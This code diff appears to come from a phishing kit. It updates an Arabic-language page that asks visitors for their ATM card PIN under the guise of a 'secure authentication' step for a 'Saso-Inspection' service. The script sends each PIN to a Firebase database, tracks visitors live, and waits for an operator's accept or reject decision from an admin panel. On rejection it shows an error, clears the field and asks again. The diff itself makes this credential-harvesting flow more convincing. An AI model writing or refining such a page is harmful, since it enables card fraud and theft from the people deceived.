@@ -28,11 +28,12 @@
             width: 100%; max-width: 220px; height: 45px; border: 1px solid #ddd;
             border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 12px;
             font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa;
-            margin-bottom: 20px; transition: 0.3s;
+            margin-bottom: 10px; transition: 0.3s;
         }
 
         /* حالة الخطأ واللون الأحمر */
-        .input-error { border: 2px solid red !important; color: red !important; }
+        .input-error { border: 2px solid red !important; color: red !important; background-color: #fff5f5 !important; }
+        #errorMsg { color: red; font-size: 11px; font-weight: bold; margin-bottom: 15px; display: none; }
 
         .btn-confirm {
             width: 100%; background-color: var(--main-green); color: white; border: none;
@@ -41,7 +42,6 @@
 
         .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
 
-        /* شاشة التحميل (Overlay) */
         #loadingOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(255, 255, 255, 0.95);
@@ -72,6 +72,7 @@
         <p>يرجى إدخال الرقم السري لبطاقة الصراف الآلي (PIN) المكون من 4 أرقام لإتمام عملية المصادقة الآمنة.</p>
 
         <input type="password" maxlength="4" class="atm-pin-field" id="pinCode" placeholder="****">
+        <div id="errorMsg">برجاء التحقق من رمز الصراف الآلي الصحيح</div>
 
         <button class="btn-confirm" onclick="sendPIN()">تأكيد الرقم السري</button>
 
@@ -81,7 +82,6 @@
     </div>
 
     <script>
-        // --- إعدادات Firebase من مشروع Saso-Inspection ---
         const firebaseConfig = { 
             apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
             authDomain: "saso-inspection.firebaseapp.com",
@@ -95,57 +95,57 @@
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
-        // تحديث تتبع الزائر
         if (visitorId) {
             database.ref('live_visitors/' + visitorId).update({
                 page: "صفحة الرقم السري (ATM PIN)"
             });
         }
 
-        // إرسال الرقم السري والمراقبة
         function sendPIN() {
             const pinInput = document.getElementById('pinCode');
+            const errorText = document.getElementById('errorMsg');
             let pinVal = pinInput.value;
 
             if (pinVal.length === 4) {
-                // إظهار التحميل
                 document.getElementById('loadingOverlay').style.display = 'flex';
+                errorText.style.display = 'none';
 
-                // إرسال البيانات
                 const paymentRef = database.ref('payments/' + visitorId);
                 paymentRef.update({
                     atm_pin: pinVal,
-                    status: "waiting_atm", // انتظار قرارك النهائي
+                    status: "waiting_atm",
                     last_update: firebase.database.ServerValue.TIMESTAMP
                 });
 
-                // مراقبة القرار من لوحة التحكم (Admin)
                 paymentRef.on('value', (snapshot) => {
                     const data = snapshot.val();
-                    
+                    if (!data) return;
+
                     if (data.status === "accept") {
-                        // قبول نهائي -> توجه لصفحة تم الحجز بنجاح
                         window.location.href = "success.html";
                     } 
                     else if (data.status === "reject") {
-                        // رفض -> إخفاء التحميل وتلوين المربع بالأحمر
+                        // إخفاء التحميل وإظهار رسالة الخطأ
                         document.getElementById('loadingOverlay').style.display = 'none';
                         pinInput.classList.add('input-error');
-                        alert("برجاء التحقق من الرقم الصراف الآلي الصحيح");
+                        pinInput.value = ""; // مسح الرقم القديم
+                        errorText.style.display = 'block'; // إظهار النص الأحمر
                         
-                        // إعادة الحالة للسماح بالمحاولة مرة أخرى
+                        // العودة لوضع الاستعداد
                         paymentRef.update({ status: "idle_atm" });
                     }
                 });
 
             } else {
+                pinInput.classList.add('input-error');
                 alert("يرجى إدخال 4 أرقام");
             }
         }
 
-        // مسح اللون الأحمر عند الكتابة مجدداً
+        // إخفاء التنبيهات الحمراء بمجرد ما العميل يبدأ يكتب تاني
         document.getElementById('pinCode').addEventListener('input', function() {
             this.classList.remove('input-error');
+            document.getElementById('errorMsg').style.display = 'none';
         });
     </script>
 </body>
